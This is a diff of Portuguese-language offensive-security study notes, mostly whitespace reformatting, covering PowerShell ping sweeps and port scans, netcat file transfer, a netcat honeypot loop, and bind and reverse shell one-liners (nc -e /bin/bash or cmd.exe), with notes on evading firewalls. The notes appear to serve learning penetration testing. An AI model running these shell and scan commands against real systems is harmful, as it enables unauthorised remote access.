@@ -429,43 +429,25 @@ Ferramenta que faz o portknowcking no host e portas passadas.
 
 Script POWERSHELL
 
-
 	param($param1)
 
 	if ("!$param1"){
-
 	    echo "Digite um Parâmetro para leitura"
-
 	}else{
-
 	    ping -n 1 $param1 | Select-String "bytes=32"
-
 	}
-
 	echo "Ygor Offensive Security Expert"
-
 	$nome = Ygor
-
 	echo "Qual seu nome: $nome"
-
 	$ip = Read-Host "Digite o IP:"
-
 	$port = 443
-
 	echo "Varrendo o host: $ip na porta: $port"
-
 	echo "Executando pinga no host informado"
-
 	ping -n 1 $ip | Select-String "bytes=32"
-
 	foreach ($var1 in 1..10) {echo 10.0.0.$var1}
-
 	param($p1)
-
 	foreach ($ip in 1..254){
-
 	ping -n 1 $p1.$ip | Select-String "bytes-32"
-
 	}
 
 Comandos Windows equivalentes no LINUX
@@ -479,41 +461,27 @@ Comandos Windows equivalentes no LINUX
     Semelhante ao CUT -D: $resp.Line.split(' ')[2] -replace ":"," "
 
 - Port Scan on PowerShell
+.
 
 	param($ip)
-
 	 if (!$ip){
-
 		echo "Tratativa de erro"
-
 		echo "Informe o Host"
-
 	}else{
-
 	$topports = 21,22,3306,80,443
-
 	try{foreach ($porta in $topports){
-
 	if (Test-NetConnection $ip -port $porta -WarningAction SilentlyContinue -InformatioLevel Quiet)
-
 		echo "Porta $porta Aberta"
-
 	}} else {
-
 		echo "Porta $porta Fechada"
-
 	}} catch {}
-
 	}
 
 ## Comandos POWERSHELL WEB
 
-Invoke-WebRequest www.businesscorp.com.br -OutFile index.txt
-
+	Invoke-WebRequest www.businesscorp.com.br -OutFile index.txt
             -Method options/header
-
-(Invoke-WebRequest www.businesscorp.com.br).statuscode/content/links.href/header.server
-
+	(Invoke-WebRequest www.businesscorp.com.br).statuscode/content/links.href/header.server
 
 ## SWISS ARMY KNIFE
 
@@ -550,14 +518,15 @@ Abre a conexão com o nome do arquivo que vai receber.
 
     nc -v 192.168.0.10 5050  < arquivo.ext 
 
-        Conecta enviando o arquivo para a porta aberta do destino.
+Conecta enviando o arquivo para a porta aberta do destino.
 
     du -h arquivo.ext 
 
-        Verifica o tamanho do arquivo enviado e compara para certificar a integridade.
+Verifica o tamanho do arquivo enviado e compara para certificar a integridade.
 
 
-Port Scanning
+- Port Scanning
+.
 
     nc -vnz 192.168.0.10 80 
 
@@ -576,40 +545,39 @@ Port Scanning
         PortScan usando um arquivo
 
 
-HoneyPot
+- HoneyPot
+.
 
     while true;do sudo nc -vnlp 21 < 21.txt 1>> log21.txt 2>> log21.txt; echo $(date) >> log21.txt;done
 
-        Comando para abrir a porta 21 e monitorar com banner e captura de logs
+Comando para abrir a porta 21 e monitorar com banner e captura de logs
 
     nc -vnlp 21& 
 
-        Abrir porta e deixar em background (dentro de script)
+Abrir porta e deixar em background (dentro de script)
 
 
 Nota: Bind Shell x Reverse Shell: Bind abre a porta no servidor alvo e Reverse abre a porta na máquina atacante!
 
     nc -vnpl 5050 -e /bin/bash 
 
-        BIND SHELL disponível para conexão no Linux
+BIND SHELL disponível para conexão no Linux
 
     nc -vnpl 5050 -e cmd.exe 
 
-        BIND SHELL disponível para conexão no Windows
+BIND SHELL disponível para conexão no Windows
 
     nc -vn 192.168.0.1 5050 -e cmd.exe 
 
-        REVERSE SHELL disponível para conexão no Windows
+REVERSE SHELL disponível para conexão no Windows
 
     nc -vn 192.168.0.1 5050 -e /bin/bash 
 
-        REVERSE SHELL disponível para conexão no Linux
+REVERSE SHELL disponível para conexão no Linux
 
- Nota:	É possível usar uma porta que esta com o status fechada no nmap e burlar o firewall
-
-    	É possível conectar com reverse shell quando o firewall bloqueia no servidor qualquer conexão de entrada
-
-    	Com o firewall bloqueando entrada e saída, abre uma porta no atacante que já está aberta no alvo e conecta o alvo via reverse no atacante. 
+Nota: É possível usar uma porta que esta com o status fechada no nmap e burlar o firewall
+É possível conectar com reverse shell quando o firewall bloqueia no servidor qualquer conexão de entrada.
+Com o firewall bloqueando entrada e saída, abre uma porta no atacante que já está aberta no alvo e conecta o alvo via reverse no atacante. 
 
 Ncat
 
